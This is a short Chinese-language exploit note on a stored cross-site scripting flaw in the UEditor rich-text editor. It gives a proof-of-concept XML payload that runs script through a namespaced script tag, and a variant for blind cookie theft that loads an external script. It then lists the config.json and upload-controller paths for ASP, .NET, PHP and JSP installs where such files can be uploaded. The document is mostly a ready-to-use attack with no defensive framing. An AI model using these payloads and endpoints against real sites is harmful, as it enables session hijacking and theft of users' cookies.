# Ueditor xss存储漏洞



直接文本框输入

漏洞POC:

```xml
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>
</html>


盲打Cookie、src=""：
<something:script src="" xmlns:something="http://www.w3.org/1999/xhtml"></something:script>
```

Ueditor 默认支持上传 xml ：config.json可以查看支持上传的后缀

/ueditor/asp/config.json
 /ueditor/net/config.json
 /ueditor/php/config.json
 /ueditor/jsp/config.json

上传文件路径

/ueditor/index.html

 /ueditor/asp/controller.asp?action=uploadimage
 /ueditor/asp/controller.asp?action=uploadfile

 /ueditor/net/controller.ashx?action=uploadimage
 /ueditor/net/controller.ashx?action=uploadfile

 /ueditor/php/controller.php?action=uploadfile
 /ueditor/php/controller.php?action=uploadimage

 /ueditor/jsp/controller.jsp?action=uploadfile
 /ueditor/jsp/controller.jsp?action=uploadimag